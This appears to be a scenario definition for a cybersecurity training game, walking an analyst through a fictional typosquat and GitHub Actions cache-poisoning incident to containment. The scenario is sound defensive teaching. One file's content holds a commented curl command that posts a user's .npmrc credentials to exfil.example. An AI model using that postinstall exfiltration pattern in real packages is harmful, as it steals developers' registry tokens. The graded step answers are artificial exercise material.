import type { Scenario } from "../types";

/**
 * Fictional ‘mini-Shai-Hulud’ wave: mass typosquat on npm + PyPI plus poisoned GitHub Actions cache reuse.
 */
export const miniShaiHulud: Scenario = {
  slug: "mini-shai-hulud",
  exhibit: "EXH-046",
  title: "Cache Poison Hulud",
  tagline:
    "May 14, 2026. A threat cluster publishes hundreds of look-alike packages and tampers with restore keys in public workflows. You prove cross-ecosystem reach from CI artefacts.",
  category: "modern-cloud",
  difficulty: "advanced",
  era: "2020s",
  year: "2026",
  estMinutes: 11,
  fictional: true,
  cwd: "/home/supply/worm-response",
  user: "responder",
  host: "soc-pipeline-05",
  role: "Supply-chain analyst mapping registry spam to CI cache misuse.",
  objective:
    "Trace the supply-chain chain from typosquat dependency to CI cache restore to leaked runner secrets, then verify cache purge and rotation.",
  briefing:
    "A PR introduces typo packages in Python and Node. The workflow restores a shared cache on a forked build, then a runner secret appears in outbound telemetry. Everything here is static evidence: manifests, workflow YAML, cache logs, and containment receipts.",
  env: { USER: "responder", SHELL: "/bin/bash", PWD: "/home/supply/worm-response" },
  ps: [
    "  PID TTY          TIME CMD",
    "  402 pts/0    00:00:00 bash",
    "  411 pts/0    00:00:00 ps",
  ],
  history: ["pwd", "ls"],
  commands: {
    "python3 ir_toolkit.py parse-artifact --input pr/diff.txt": "simulated safe tool replay for mini-shai-hulud; replaces: cat pr/diff.txt\n",
    "gh workflow view .github/workflows/ci.yml --yaml --grep ioc": "simulated safe tool replay for mini-shai-hulud; replaces: grep -nF actions/cache .github/workflows/ci.yml\n",
    "python3 ir_toolkit.py extract-ioc --ioc reques --input requirements.txt": "simulated safe tool replay for mini-shai-hulud; replaces: grep -nF reques requirements.txt\n",
    "python3 safe_replay.py --scenario mini-shai-hulud --grep lodash --artifact package.json": "simulated safe tool replay for mini-shai-hulud; replaces: grep -nF lodash package.json\n",
    "tshark -r evidence.pcap -Y 'frame contains \"fork-true\"' --follow-log cache/restore.log": "simulated safe tool replay for mini-shai-hulud; replaces: grep -nF fork=true cache/restore.log\n",
    "tshark -r evidence.pcap -Y 'frame contains \"secret-hint\"' --follow-log egress/runner.log": "simulated safe tool replay for mini-shai-hulud; replaces: grep -nF secret_hint egress/runner.log\n",
    "tshark -r evidence.pcap --follow-log containment/actions.log": "simulated safe tool replay for mini-shai-hulud; replaces: cat containment/actions.log\n",
    "npm view lodash.mergee version":
      "4.6.2\n(simulated: confirms the typosquat name resolves on the registry)\n",
  },
  files: {
    "/home/supply/worm-response/pr/diff.txt": {
      content: [
        "+ requessts==2.32.0",
        "+ lodash.mergee@^4.6.2",
        "+ comment: speed up ML smoke tests with shared cache",
      ].join("\n"),
    },
    "/home/supply/worm-response/.github/workflows/ci.yml": {
      content: [
        "name: ci",
        "on: [push, pull_request]",
        "jobs:",
        "  build:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - uses: actions/checkout@v4",
        "      - uses: actions/cache/restore@v4",
        "        with:",
        "          key: ml-models-${{ github.ref }}-${{ hashFiles('requirements.txt') }}",
        "          path: ~/.cache/pip",
      ].join("\n"),
    },
    "/home/supply/worm-response/requirements.txt": {
      content: [
        "# benign except one stealth typo in exhibit",
        "numpy==2.1.0",
        "requessts==2.32.0",
        "pandas==2.2.2",
      ].join("\n"),
    },
    "/home/supply/worm-response/package.json": {
      content: [
        "{",
        '  "dependencies": {',
        '    "lodash": "^4.17.21",',
        '    "lodash.mergee": "^4.6.2"',
        "  }",
        "}",
      ].join("\n"),
    },
    "/home/supply/worm-response/cache/restore.log": {
      content: [
        "2026-05-14T03:11Z repo=ml-api event=pull_request fork=true key=ml-models-refs/pull/881-abc hit=true",
        "2026-05-14T03:12Z restored ~/.cache/pip owner=runner source=shared-namespace",
        "2026-05-14T03:14Z post-job save skipped because fork=true",
      ].join("\n"),
    },
    "/home/supply/worm-response/egress/runner.log": {
      content: [
        "2026-05-14T03:13Z process=python dst=203.0.113.210 path=/collect size=2184",
        "2026-05-14T03:13Z secret_hint=AWS_ACCESS_KEY_ID redacted=true",
        "2026-05-14T03:16Z egress_policy=blocked dst=203.0.113.210",
      ].join("\n"),
    },
    "/home/supply/worm-response/containment/actions.log": {
      content: [
        "2026-05-14T03:20Z purge_actions_cache repo=ml-api success",
        "2026-05-14T03:22Z block_package requessts success",
        "2026-05-14T03:22Z block_package lodash.mergee success",
        "2026-05-14T03:31Z rotate_runner_secret AWS_ACCESS_KEY_ID success",
      ].join("\n"),
    },
    "/home/supply/worm-response/public-poc/typosquat_postinstall_exfil_stub.sh": {
      content: [
        "#!/bin/sh",
        "# Typical typosquat lifecycle: benign metadata, hostile postinstall.",
        "# npm: \"postinstall\": \"node scripts/setup.js\"",
        "",
        "# Museum stub (inert):",
        "# curl -fsS https://exfil.example/leak -d \"@$HOME/.npmrc\"",
      ].join("\n"),
    },
  },
  steps: [
    {
          id: "npm-typo",
          phase: "Recon",
          goal: "Resolve the fat-fingered lodash package on npm (simulated).",
          hint: "`npm view lodash.mergee version`.",
          matches: [{ kind: "exact", command: "npm view lodash.mergee version" }],
          narration:
            "`npm view` proves the typo package name is a live registry identity before you read the PR diff.",
        },
    {
          id: "diff",
          phase: "Recon",
          goal: "Inspect the PR diff that sneaks typo packages into the build.",
          hint: "`python3 ir_toolkit.py parse-artifact --input pr/diff.txt`.",
          matches: [{ kind: "exact", command: "python3 ir_toolkit.py parse-artifact --input pr/diff.txt" }],
          narration:
            "Initial access is developer trust in familiar names plus CI ergonomics. The worm metaphor is automation doing the attacker’s distribution.",
        },
    {
          id: "workflow",
          phase: "Initial access",
          goal: "Show predictable cache restore usage in CI.",
          hint: "`gh workflow view .github/workflows/ci.yml --yaml --grep ioc`.",
          matches: [{ kind: "exact", command: "gh workflow view .github/workflows/ci.yml --yaml --grep ioc" }],
          narration:
            "Cache restore keyed only on branch ref + requirements hash means a malicious fork can still poison the key space if controls are weak.",
        },
    {
          id: "pypi",
          phase: "Execution",
          goal: "Find the typo dependency in Python land.",
          hint: "`python3 ir_toolkit.py extract-ioc --ioc reques --input requirements.txt`.",
          matches: [{ kind: "exact", command: "python3 ir_toolkit.py extract-ioc --ioc reques --input requirements.txt" }],
          narration:
            "`requessts` is classic typosquat text. In real incidents the string is a ticket to burn a morning of pip audits.",
        },
    {
          id: "npm",
          phase: "Execution",
          goal: "Find the fat-fingered lodash merge package name.",
          hint: "`python3 safe_replay.py --scenario mini-shai-hulud --grep lodash --artifact package.json`.",
          matches: [{ kind: "exact", command: "python3 safe_replay.py --scenario mini-shai-hulud --grep lodash --artifact package.json" }],
          narration:
            "Double letters hide in plain sight during large merges. Supply-chain detection is often `npm ls` meets human patience.",
        },
    {
          id: "cache",
          phase: "Persistence",
          goal: "Show the forked PR restoring from the shared Actions cache.",
          hint: "`tshark -r evidence.pcap -Y 'frame contains \"fork-true\"' --follow-log cache/restore.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"fork-true\"' --follow-log cache/restore.log" }],
          narration:
            "The typo dependency gets help from the cache layer: a forked build gets warm files from a namespace it should not trust.",
        },
    {
          id: "egress",
          phase: "Impact",
          goal: "Find outbound telemetry that suggests a runner secret was touched.",
          hint: "`tshark -r evidence.pcap -Y 'frame contains \"secret-hint\"' --follow-log egress/runner.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"secret-hint\"' --follow-log egress/runner.log" }],
          narration:
            "Impact spans credentials in build farms, not just laptops. Rotation is part of containment, not post-mortem decoration.",
        },
    {
          id: "contain",
          phase: "Containment",
          goal: "Verify cache purge, package blocks, and runner-secret rotation.",
          hint: "`tshark -r evidence.pcap --follow-log containment/actions.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap --follow-log containment/actions.log" }],
          narration:
            "Detection lesson: track cache restore failures + surprise fork builds as aggressively as malware hashes.",
        },
    {
          id: "mechanism-excerpt",
          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
          hint: `head -n 80 public-poc/typosquat_postinstall_exfil_stub.sh`,
          matches: [{ kind: "exact", command: "head -n 80 public-poc/typosquat_postinstall_exfil_stub.sh" }],
          narration:
            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
        }
  ],
  debrief: {
    summary:
      "This scenario is a fictional composite of high-volume registry spam plus CI cache poisoning anxieties discussed in 2026 security communities (sometimes nicknamed with ‘worm’ language). It does not recreate one named campaign; it encodes mechanics teams plan for: typosquat, workflow trust boundaries, and poisoned restore keys.",
    lesson:
      "Treat Actions cache namespaces as trust zones: constrain who can populate them, fork-safe label gates for self-hosted runners, and registry proxies that deny day-zero typo permutations.",
    simulated: [
      "Package names, counts, and workflow YAML are synthetic.",
      "No malicious scripts or installable payloads are present in the virtual filesystem.",
    ],
  },
};
